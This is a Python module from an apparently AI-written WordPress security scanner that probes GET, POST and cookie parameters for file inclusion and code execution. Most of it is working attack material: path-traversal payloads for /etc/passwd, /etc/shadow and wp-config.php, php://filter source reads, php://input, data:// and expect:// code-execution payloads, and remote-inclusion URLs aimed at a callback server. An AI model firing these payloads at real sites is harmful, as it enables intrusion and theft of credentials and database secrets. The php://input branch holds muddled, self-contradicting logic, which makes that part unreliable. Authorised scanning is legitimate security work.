# Module for WordPress File Inclusion (LFI/RFI) Checks
import requests
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode, quote_plus, unquote

from .utils import make_request # Assuming make_request can handle 'data' for POST and 'cookies'

# Common parameters that might be vulnerable to LFI/RFI
LFI_RFI_TARGET_PARAMS = [
    "file", "page", "template", "include", "document", "doc", "path", "root", "item",
    "pg", "style", "pdf", "view", "show", "load", "lang", "layout", "content", "cat",
    "p", "id", "name", "filename", "url", "uri", "dir", "folder", "action", "module",
    "go", "return", "redirect", "img", "image", "input", "param", "conf", "config"
]

# Expanded LFI payloads and expected content patterns
# Payloads include various traversal depths, null bytes, and common file targets.
LFI_PAYLOADS = {
    # Linux Basic
    "../../../../../../../../../../etc/passwd": re.compile(r"root:x:0:0:"),
    "../../../../../../../../../../etc/shadow": re.compile(r"root:[*\$!].*?:"), # Often permission denied
    "../../../../../../../../../../etc/hosts": re.compile(r"localhost|127\.0\.0\.1"),
    "../../../../../../../../../../etc/issue": re.compile(r"\\[a-zA-Z]"), # Contains system identifiers
    "../../../../../../../../../../etc/group": re.compile(r"root:x:0:"),
    "../../../../../../../../../../etc/motd": re.compile(r"Message of the day|Linux|Ubuntu|Debian|CentOS", re.IGNORECASE),
    "../../../../../../../../../../etc/resolv.conf": re.compile(r"nameserver\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"),
    # Linux Logs (often require specific permissions or conditions)
    "../../../../../../../../../../var/log/auth.log": re.compile(r"session opened for user|received disconnect", re.IGNORECASE),
    "../../../../../../../../../../var/log/syslog": re.compile(r"kernel:|systemd\[", re.IGNORECASE),
    "../../../../../../../../../../var/log/apache2/access.log": re.compile(r"GET /|POST /", re.IGNORECASE), # If attacker can control log content
    "../../../../../../../../../../var/log/apache2/error.log": re.compile(r"client denied by server configuration|script not found or unable to stat", re.IGNORECASE),
    "../../../../../../../../../../var/log/nginx/access.log": re.compile(r"GET /|POST /", re.IGNORECASE),
    "../../../../../../../../../../var/log/nginx/error.log": re.compile(r"client denied by server configuration|No such file or directory", re.IGNORECASE),
    # Linux Proc FS
    "../../../../../../../../../../proc/self/environ": re.compile(r"USER=|HOME=|PATH=|HTTP_USER_AGENT="),
    "../../../../../../../../../../proc/version": re.compile(r"Linux version", re.IGNORECASE),
    "../../../../../../../../../../proc/cmdline": re.compile(r"BOOT_IMAGE=|root="),
    "../../../../../../../../../../proc/sched_debug": re.compile(r"cpu#\d+\s+\d+\s+\d+\s+\d+"),
    # Windows
    "../../../../../../../../../../boot.ini": re.compile(r"\[boot loader\]", re.IGNORECASE),
    "../../../../../../../../../../windows/win.ini": re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.IGNORECASE),
    "../../../../../../../../../../windows/system32/drivers/etc/hosts": re.compile(r"localhost|127\.0\.0\.1"),
    "../../../../../../../../../../windows/repair/sam": re.compile(r""), # Binary, check for non-empty or specific errors
    "../../../../../../../../../../winnt/win.ini": re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.IGNORECASE), # Older Windows
    # WordPress specific (relative to typical include location, various depths)
    "wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../../../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "../../../../wp-config.php": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY", re.IGNORECASE),
    "wp-load.php": re.compile(r"wp-settings\.php", re.IGNORECASE),
    # Web server files
    ".htaccess": re.compile(r"RewriteRule|DirectoryIndex|php_value", re.IGNORECASE),
    "../.htaccess": re.compile(r"RewriteRule|DirectoryIndex|php_value", re.IGNORECASE),
    "../../.htaccess": re.compile(r"RewriteRule|DirectoryIndex|php_value", re.IGNORECASE),
    # Null Byte (effectiveness depends on PHP version and config)
    "../../../../../../../../../../etc/passwd%00": re.compile(r"root:x:0:0:"),
    "wp-config.php%00": re.compile(r"DB_NAME|DB_USER|DB_PASSWORD", re.IGNORECASE),
    # Path Truncation / Obfuscation (basic examples)
    "../../../../../../../../../../etc/passwd/./././.": re.compile(r"root:x:0:0:"),
    "../../../../../../../../../../etc/passwd%2500": re.compile(r"root:x:0:0:"), # Double encoded null
    "....//....//....//....//....//....//etc/passwd": re.compile(r"root:x:0:0:"), # Filter bypass attempt
    "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd": re.compile(r"root:x:0:0:"), # URL encoded slashes
}

# PHP filter LFI/RCE payloads. Target file needs to be appended.
# Some of these can lead to RCE.
PHP_WRAPPER_PAYLOAD_TEMPLATES = {
    # Read source using filters
    "php://filter/convert.base64-encode/resource={target_file}": {"type": "LFI-Filter-Base64", "pattern": re.compile(r"[a-zA-Z0-9+/=]{20,}")},
    "php://filter/read=string.rot13/resource={target_file}": {"type": "LFI-Filter-Rot13", "pattern": re.compile(r"<\?cuc|\?/>|shapgvba|rpub|vaqhrerg", re.IGNORECASE)},
    "php://filter/convert.iconv.UTF-8.UTF-16LE/resource={target_file}": {"type": "LFI-Filter-UTF16", "pattern": re.compile(r".", re.DOTALL)}, # Broad, check for any content
    "php://filter/zlib.deflate/resource={target_file}": {"type": "LFI-Filter-Zlib", "pattern": re.compile(r".", re.DOTALL)}, # Needs specific handling to decode
    # RCE via php://input (requires POST request with PHP code in body)
    "php://input": {"type": "RCE-PHP-Input", "pattern": re.compile(r"CLINE_PHPINFO_MARKER_OUTPUT"), "post_data": "<?php echo 'CLINE_PHPINFO_MARKER_OUTPUT'; phpinfo(); ?>"},
    # RCE via expect:// (requires expect extension, very dangerous)
    "expect://id": {"type": "RCE-Expect", "pattern": re.compile(r"uid=\d+\(.*?\)\s+gid=\d+\(.*?\)")},
    "expect://ls": {"type": "RCE-Expect", "pattern": re.compile(r"total\s\d+|[a-zA-Z0-9_\-\.]+\s*")}, # Basic ls output
    # RCE via data:// (requires allow_url_include)
    "data://text/plain;base64," + base64.b64encode(b"<?php echo 'CLINE_DATA_RCE_MARKER'; phpinfo(); ?>").decode(): {"type": "RCE-Data-Wrapper", "pattern": re.compile(r"CLINE_DATA_RCE_MARKER")},
    # Zip wrapper (requires zip extension and a known/uploaded archive)
    # "zip://./archive.zip#{target_file}": {"type": "LFI-Zip", "pattern": re.compile(r"...")}, # Example, needs specific setup
}

# Target files for PHP wrappers (especially filters)
PHP_WRAPPER_TARGET_FILES = [
    "index.php", "wp-config.php", "wp-load.php", "license.txt", "readme.html",
    "../wp-config.php", "../../wp-config.php", # Relative paths
    "/etc/passwd", # Absolute paths (less likely with 'resource=' but worth trying)
]

# RFI Payloads
RFI_CALLBACK_MARKER = "CLINERFICALLBACKMARKERWPASCAN" # Unique marker
# User should configure their own callback server for RFI_ADVANCED_PAYLOAD
RFI_ADVANCED_PAYLOAD_TEMPLATE = "http://{callback_server}/rfi_check.php?marker=" + RFI_CALLBACK_MARKER
RFI_GENERIC_PAYLOAD = "http://example.com/nonexistent_rfi_test_file_wpascan.txt"

# RFI success patterns (error messages or callback marker)
RFI_SUCCESS_PATTERNS = [
    re.compile(RFI_CALLBACK_MARKER, re.IGNORECASE), # If using callback
    re.compile(r"failed to open stream: HTTP request failed", re.IGNORECASE),
    re.compile(r"include\(" + re.escape(RFI_GENERIC_PAYLOAD) + r"\): failed to open stream", re.IGNORECASE),
    re.compile(r"failed opening required '" + re.escape(RFI_GENERIC_PAYLOAD) + r"'", re.IGNORECASE),
    re.compile(r"URL file-access is disabled in the server configuration", re.IGNORECASE), # Indicates allow_url_fopen/include might be off but tried
    re.compile(r"Connection timed out after \d+ milliseconds", re.IGNORECASE) # If it tries to connect
]


def test_single_payload(test_url, config, payload_info, method="GET", post_data=None, cookies=None):
    """Helper to test a single payload and check for success patterns."""
    payload_type = payload_info.get("type", "Direct LFI")
    success_pattern = payload_info.get("pattern")
    payload_value = payload_info.get("payload_value", str(payload_info)) # For LFI_PAYLOADS

    print(f"          Trying {payload_type}: {str(payload_value)[:70]}... on {test_url}")
    try:
        response = make_request(test_url, config, method=method, data=post_data, cookies=cookies, timeout=10)
        if response and response.text:
            if success_pattern and success_pattern.search(response.text):
                return {"success": True, "observation": f"Pattern '{success_pattern.pattern}' matched for {payload_type}."}
            # For base64, try to decode and check for PHP tags
            if payload_type == "LFI-Filter-Base64":
                try:
                    decoded_content = base64.b64decode(response.text.strip()).decode('utf-8', 'ignore')
                    if re.search(r"<\?php|<\?=|\?>|define\(|require\(|include\(", decoded_content, re.IGNORECASE):
                        return {"success": True, "observation": "Decoded Base64 content contains PHP keywords."}
                except Exception:
                    pass # Not valid base64 or cannot decode
            # For RFI, check generic patterns too
            if "RFI" in payload_type:
                 for rfi_pattern in RFI_SUCCESS_PATTERNS:
                     if rfi_pattern.search(response.text):
                         return {"success": True, "observation": f"RFI pattern '{rfi_pattern.pattern}' matched."}

    except requests.exceptions.Timeout:
        if "RFI" in payload_type or payload_type == "RCE-PHP-Input": # Timeouts can be indicative for RFI or slow RCE
            return {"success": True, "observation": f"{payload_type} request timed out, potentially indicative."}
    except Exception as e:
        print(f"            [-] Error testing {payload_type}: {e}")
    return {"success": False}


def analyze_file_inclusion(state, config, target_url, post_params=None, cookie_params=None):
    """
    Performs enhanced heuristic checks for potential LFI/RFI/RCE vulnerabilities.
    Tests GET, POST, and Cookie parameters.
    """
    module_key = "wp_analyzer"
    findings_key = "file_inclusion"

    all_wp_analyzer_findings = state.get_module_findings(module_key, {})
    findings = all_wp_analyzer_findings.get(findings_key, {})
    if not findings:
        findings = {
            "status": "Not Checked",
            "details": "",
            "potential_lfi_points": [],
            "potential_rfi_points": [],
            "potential_rce_points": [],
            "recommendation": "Use dedicated LFI/RFI/RCE scanning tools and techniques for comprehensive analysis. " \
                              "Validate all user inputs, use whitelists, disable dangerous PHP functions/wrappers if not needed, " \
                              "and keep server/PHP updated."
        }

    findings["status"] = "Running"
    findings["details"] = "Performing enhanced heuristic LFI/RFI/RCE checks..."
    for list_key in ["potential_lfi_points", "potential_rfi_points", "potential_rce_points"]:
        if list_key not in findings: findings[list_key] = []
            
    all_wp_analyzer_findings[findings_key] = findings
    state.update_module_findings(module_key, all_wp_analyzer_findings)

    print("    [i] Performing enhanced LFI/RFI/RCE heuristic checks...")
    
    parsed_target_url = urlparse(target_url)
    base_url_for_post = parsed_target_url._replace(query="").geturl() # For POST tests

    # Combine all parameters to test (GET, POST, COOKIE)
    params_to_test = []
    
    # 1. GET parameters
    original_get_params = parse_qs(parsed_target_url.query)
    if original_get_params:
        print(f"      [+] Found {len(original_get_params)} GET parameter(s) in URL: {target_url}")
        for param, values in original_get_params.items():
            if param.lower() in LFI_RFI_TARGET_PARAMS:
                params_to_test.append({"name": param, "value": values[0], "source": "GET", "original_params": original_get_params.copy()})

    # 2. POST parameters (if provided)
    if post_params: # Expected to be a dict like {'param_name': 'value'}
        print(f"      [+] Found {len(post_params)} POST parameter(s) to test.")
        for param, value in post_params.items():
             if param.lower() in LFI_RFI_TARGET_PARAMS:
                params_to_test.append({"name": param, "value": str(value), "source": "POST", "original_params": post_params.copy()})
    
    # 3. Cookie parameters (if provided)
    if cookie_params: # Expected to be a dict like {'cookie_name': 'value'}
        print(f"      [+] Found {len(cookie_params)} Cookie parameter(s) to test.")
        for param, value in cookie_params.items():
            if param.lower() in LFI_RFI_TARGET_PARAMS: # Less common, but possible
                params_to_test.append({"name": param, "value": str(value), "source": "COOKIE", "original_params": cookie_params.copy()})


    if not params_to_test:
        findings["details"] = "No relevant query, POST, or cookie parameters found/provided to test for LFI/RFI/RCE."
        findings["status"] = "Completed"
        all_wp_analyzer_findings = state.get_module_findings(module_key, {})
        all_wp_analyzer_findings[findings_key] = findings
        state.update_module_findings(module_key, all_wp_analyzer_findings)
        print("      [i] No relevant parameters for LFI/RFI/RCE checks.")
        return

    lfi_points, rfi_points, rce_points = [], [], []

    for p_info in params_to_test:
        param_name = p_info["name"]
        original_value = p_info["value"]
        param_source = p_info["source"]
        current_original_params = p_info["original_params"] # This will be dict of lists for GET, dict for POST/COOKIE

        print(f"      [*] Testing param '{param_name}' (source: {param_source}, original value: '{str(original_value)[:50]}')")
        
        param_vuln_found = False

        # A. Test for Direct LFI
        print(f"        Testing Direct LFI for param '{param_name}'...")
        for lfi_payload_str, content_pattern in LFI_PAYLOADS.items():
            if param_vuln_found: break
            
            modified_params = {}
            current_post_data = None
            current_cookies = None
            test_url_lfi = target_url # Default for GET

            if param_source == "GET":
                # original_params is dict of lists from parse_qs
                modified_params = {k: v[0] for k, v in current_original_params.items()}
                modified_params[param_name] = lfi_payload_str
                test_url_lfi = parsed_target_url._replace(query=urlencode(modified_params)).geturl()
            elif param_source == "POST":
                current_post_data = current_original_params.copy()
                current_post_data[param_name] = lfi_payload_str
                test_url_lfi = base_url_for_post # POST to base URL without GET params unless intended
            elif param_source == "COOKIE":
                current_cookies = current_original_params.copy()
                current_cookies[param_name] = lfi_payload_str
                # test_url_lfi remains target_url, cookies handled by make_request

            result = test_single_payload(test_url_lfi, config, 
                                         {"type": "Direct LFI", "pattern": content_pattern, "payload_value": lfi_payload_str},
                                         method=param_source if param_source == "POST" else "GET", 
                                         post_data=current_post_data, cookies=current_cookies)
            if result["success"]:
                point = {"url": test_url_lfi, "parameter": param_name, "payload": lfi_payload_str, "type": "Direct LFI",
                         "source": param_source, "observation": result["observation"]}
                lfi_points.append(point)
                param_vuln_found = True
                print(f"            [!!!] Potential Direct LFI: {param_name} ({param_source}) with {lfi_payload_str[:60]}")
        
        # B. Test for PHP Wrapper LFI/RCE
        if not param_vuln_found:
            print(f"        Testing PHP Wrappers for param '{param_name}'...")
            
            # Determine target files: original value if it looks like a file, plus defaults
            targets_for_wrapper = set()
            if re.match(r"[\w\-\./\\]+\.(php|txt|html|ini|log)$", str(original_value), re.IGNORECASE):
                targets_for_wrapper.add(str(original_value))
            targets_for_wrapper.update(PHP_WRAPPER_TARGET_FILES)

            for wrapper_payload_template, info in PHP_WRAPPER_PAYLOAD_TEMPLATES.items():
                if param_vuln_found and not info["type"].startswith("RCE"): break # Stop LFI if found, but try all RCE

                payloads_to_try_for_wrapper = []
                if "{target_file}" in wrapper_payload_template:
                    for target_file in targets_for_wrapper:
                        payloads_to_try_for_wrapper.append(wrapper_payload_template.format(target_file=target_file))
                else: # Payloads like php://input, expect://id
                    payloads_to_try_for_wrapper.append(wrapper_payload_template)

                for concrete_payload_str in payloads_to_try_for_wrapper:
                    if param_vuln_found and not info["type"].startswith("RCE"): break

                    current_post_data_wrapper = None
                    current_cookies_wrapper = None
                    test_url_wrapper = target_url
                    http_method = "GET"

                    # Special handling for php://input (requires POST)
                    if info["type"] == "RCE-PHP-Input":
                        http_method = "POST"
                        # The payload for the *parameter* is "php://input"
                        # The actual PHP code to execute is sent in the POST body
                        current_post_data_wrapper = info.get("post_data", "") # This is the body, not param
                        # If the vulnerable param is POST, we modify it. If GET, we add POST body.
                        if param_source == "POST":
                            temp_post_params = current_original_params.copy()
                            temp_post_params[param_name] = concrete_payload_str # e.g., param_to_vuln=php://input
                            # The actual PHP code is sent as raw body, not as a param value here.
                            # This needs make_request to handle raw post_data if param_source is GET.
                            # For simplicity, if param_source is POST, we assume the PHP code is the value of *another* param or raw body.
                            # Let's assume for now `make_request` sends `info.get("post_data")` as raw body if method is POST.
                            # And the vulnerable parameter `param_name` is set to `concrete_payload_str`.
                            current_post_data_wrapper = temp_post_params # This is wrong.
                            # Correct logic: param_name gets 'php://input', body is PHP code.
                            # Let's simplify: if testing php://input, the request body is the PHP code.
                            # The vulnerable parameter is assigned 'php://input'.
                            if param_source == "GET":
                                modified_get_params = {k: v[0] for k, v in current_original_params.items()}
                                modified_get_params[param_name] = concrete_payload_str
                                test_url_wrapper = parsed_target_url._replace(query=urlencode(modified_get_params)).geturl()
                                # The POST data (PHP code) will be sent with this GET request's URL.
                                # This is unusual. php://input is typically exploited via POST parameters.
                                # For now, we'll assume if php://input is tested, it's a POST request.
                                http_method = "POST" # Force POST
                                current_post_data_wrapper = info.get("post_data") # Raw body
                                if param_source == "POST": # If original was POST
                                     current_post_data_wrapper = current_original_params.copy()
                                     current_post_data_wrapper[param_name] = concrete_payload_str # param=php://input
                                     # This is still tricky. The *actual* PHP code needs to be the body.
                                     # Let's assume if type is RCE-PHP-Input, method is POST, and body is info["post_data"]
                                     # And the vulnerable param is set to "php://input"
                                     # This part of the logic is complex and needs careful make_request integration.
                                     # Simplified:
                                     # The parameter being tested (param_name) is set to "php://input"
                                     # The request method is POST
                                     # The body of the POST request is info.get("post_data")
                                     # This means other original POST params are ignored for this specific test.
                                     pass # Will be handled by general logic below.

                        elif param_source == "COOKIE":
                             # Similar to GET, but cookie is set. Method becomes POST.
                             http_method = "POST" # Force POST
                             current_post_data_wrapper = info.get("post_data") # Raw body
                        # General assignment for php://input
                        if info["type"] == "RCE-PHP-Input": http_method = "POST"


                    # General parameter modification
                    if param_source == "GET":
                        modified_params_wrapper = {k: v[0] for k, v in current_original_params.items()}
                        modified_params_wrapper[param_name] = concrete_payload_str
                        test_url_wrapper = parsed_target_url._replace(query=urlencode(modified_params_wrapper)).geturl()
                        if info["type"] == "RCE-PHP-Input": # If it's php://input, send the payload in POST body
                             current_post_data_wrapper = info.get("post_data")
                    elif param_source == "POST":
                        current_post_data_wrapper = current_original_params.copy()
                        current_post_data_wrapper[param_name] = concrete_payload_str
                        test_url_wrapper = base_url_for_post
                        if info["type"] == "RCE-PHP-Input": # Override entire body with PHP code
                            current_post_data_wrapper = info.get("post_data")
                    elif param_source == "COOKIE":
                        current_cookies_wrapper = current_original_params.copy()
                        current_cookies_wrapper[param_name] = concrete_payload_str
                        if info["type"] == "RCE-PHP-Input":
                             current_post_data_wrapper = info.get("post_data")
                    
                    result = test_single_payload(test_url_wrapper, config,
                                                 {"type": info["type"], "pattern": info["pattern"], "payload_value": concrete_payload_str},
                                                 method=http_method, # Use determined method
                                                 post_data=current_post_data_wrapper, 
                                                 cookies=current_cookies_wrapper)
                    if result["success"]:
                        point_data = {"url": test_url_wrapper, "parameter": param_name, "payload": concrete_payload_str, 
                                      "type": info["type"], "source": param_source, "observation": result["observation"]}
                        if info["type"].startswith("RCE"):
                            rce_points.append(point_data)
                            print(f"            [!!!] Potential RCE ({info['type']}): {param_name} ({param_source}) with {concrete_payload_str[:70]}")
                        else: # LFI via filter
                            lfi_points.append(point_data)
                            print(f"            [!!!] Potential LFI ({info['type']}): {param_name} ({param_source}) with {concrete_payload_str[:70]}")
                        param_vuln_found = True # Found some form of LFI/RCE via wrapper

        # C. Test for RFI
        if not param_vuln_found: # Only if no LFI/RCE found for this param yet
            print(f"        Testing RFI for param '{param_name}'...")
            
            rfi_payloads_to_test = [RFI_GENERIC_PAYLOAD]
            rfi_callback_server = config.get("rfi_callback_server") # e.g., "mycallback.com:1234"
            if rfi_callback_server:
                rfi_payloads_to_test.append(RFI_ADVANCED_PAYLOAD_TEMPLATE.format(callback_server=rfi_callback_server))

            for rfi_payload_str in rfi_payloads_to_test:
                if param_vuln_found: break

                modified_params_rfi = {}
                current_post_data_rfi = None
                current_cookies_rfi = None
                test_url_rfi = target_url

                if param_source == "GET":
                    modified_params_rfi = {k: v[0] for k, v in current_original_params.items()}
                    modified_params_rfi[param_name] = rfi_payload_str
                    test_url_rfi = parsed_target_url._replace(query=urlencode(modified_params_rfi)).geturl()
                elif param_source == "POST":
                    current_post_data_rfi = current_original_params.copy()
                    current_post_data_rfi[param_name] = rfi_payload_str
                    test_url_rfi = base_url_for_post
                elif param_source == "COOKIE":
                    current_cookies_rfi = current_original_params.copy()
                    current_cookies_rfi[param_name] = rfi_payload_str
                
                # RFI success pattern is more generic, handled by test_single_payload
                result = test_single_payload(test_url_rfi, config,
                                             {"type": "RFI", "pattern": None, "payload_value": rfi_payload_str}, # Pattern handled by RFI_SUCCESS_PATTERNS
                                             method=param_source if param_source == "POST" else "GET",
                                             post_data=current_post_data_rfi, cookies=current_cookies_rfi)
                if result["success"]:
                    point = {"url": test_url_rfi, "parameter": param_name, "payload": rfi_payload_str, "type": "RFI",
                             "source": param_source, "observation": result["observation"]}
                    rfi_points.append(point)
                    param_vuln_found = True
                    print(f"            [!!!] Potential RFI: {param_name} ({param_source}) with {rfi_payload_str}")

    # Finalize findings
    if lfi_points: findings["potential_lfi_points"].extend(lfi_points)
    if rfi_points: findings["potential_rfi_points"].extend(rfi_points)
    if rce_points: findings["potential_rce_points"].extend(rce_points)

    details_parts = []
    if findings["potential_lfi_points"]: details_parts.append(f"{len(findings['potential_lfi_points'])} potential LFI point(s)")
    if findings["potential_rfi_points"]: details_parts.append(f"{len(findings['potential_rfi_points'])} potential RFI point(s)")
    if findings["potential_rce_points"]: details_parts.append(f"{len(findings['potential_rce_points'])} potential RCE point(s)")

    if details_parts:
        findings["details"] = f"Found {', '.join(details_parts)}. Manual verification and specialized tools are CRUCIAL."
        severity = "High" if findings["potential_rce_points"] else "Medium" if findings["potential_rfi_points"] else "Low" # Simplified
        if findings["potential_rce_points"]: severity = "Critical"
        elif findings["potential_rfi_points"]: severity = "High"
        elif findings["potential_lfi_points"]: severity = "Medium"


        state.add_remediation_suggestion("file_inclusion_vulnerability", {
            "source": "WP Analyzer (File Inclusion Module - Enhanced)",
            "description": f"Enhanced heuristic checks suggest potential File Inclusion/Execution vulnerabilities: {', '.join(details_parts)}. " \
                           "These findings require immediate manual verification.",
            "severity": severity,
            "remediation": "Immediately investigate and fix any confirmed vulnerabilities. Key measures: " \
                           "1. Sanitize and validate ALL user-supplied input used in file operations or include statements. " \
                           "2. Implement strict whitelisting for allowed file names/paths. " \
                           "3. Disable `allow_url_fopen` and `allow_url_include` in php.ini if remote file inclusion is possible and not strictly necessary. " \
                           "4. Disable dangerous PHP functions/wrappers (e.g., `expect://` via `disable_functions` or `disable_classes` in php.ini) if not essential. " \
                           "5. Ensure PHP and web server software are up-to-date. " \
                           "6. Conduct thorough penetration testing with specialized tools."
        })
    else:
        findings["details"] = "No obvious LFI/RFI/RCE indicators from enhanced heuristics. This does not rule out vulnerabilities. Use specialized tools for deep analysis."

    findings["status"] = "Completed"
    all_wp_analyzer_findings = state.get_module_findings(module_key, {}) # Re-fetch
    all_wp_analyzer_findings[findings_key] = findings
    state.update_module_findings(module_key, all_wp_analyzer_findings)
    print(f"    [+] Enhanced LFI/RFI/RCE heuristic checks finished. Details: {findings['details']}")

# Example of how this might be called (conceptual, depends on main scanner structure)
# if __name__ == '__main__':
#     # Mock state and config
#     class MockState:
#         def __init__(self): self.findings = {}
#         def get_module_findings(self, mk, default): return self.findings.get(mk, default)
#         def update_module_findings(self, mk, data): self.findings[mk] = data; print(f"State updated for {mk}: {data}")
#         def add_remediation_suggestion(self, k, v): print(f"Remediation: {k} - {v}")
# 
#     mock_state = MockState()
#     mock_config = {"rfi_callback_server": "localhost:8000"} # Your local server for testing RFI callback
# 
#     test_target_get = "http://localhost/test_vuln_app/vuln_page.php?file=index.html&page=about.php"
#     test_target_post_base = "http://localhost/test_vuln_app/post_vuln.php"
#     post_data_to_test = {"template": "main.tpl", "doc_id": "123"}
#     cookie_data_to_test = {"user_pref_lang": "en.txt", "session_include": "header.inc"}

#     print("\n--- Testing GET parameters ---")
#     analyze_file_inclusion(mock_state, mock_config, test_target_get)
# 
#     # Reset findings for next test run if needed by clearing mock_state or specific keys
#     mock_state.findings.pop("wp_analyzer", None) 
#     print("\n--- Testing POST parameters ---")
#     analyze_file_inclusion(mock_state, mock_config, test_target_post_base, post_params=post_data_to_test)
# 
#     mock_state.findings.pop("wp_analyzer", None)
#     print("\n--- Testing Cookie parameters ---")
#     analyze_file_inclusion(mock_state, mock_config, test_target_get, cookie_params=cookie_data_to_test) # Test cookies on a GET URL
# 
#     mock_state.findings.pop("wp_analyzer", None)
#     print("\n--- Testing All (GET, POST, COOKIE) on a POST target URL ---")
#     # Example: target URL might have some GET params, but we also provide POST and COOKIE data
#     test_target_mixed = "http://localhost/test_vuln_app/mixed_vuln.php?debug_file=log.txt" 
#     analyze_file_inclusion(mock_state, mock_config, test_target_mixed, post_params=post_data_to_test, cookie_params=cookie_data_to_test)
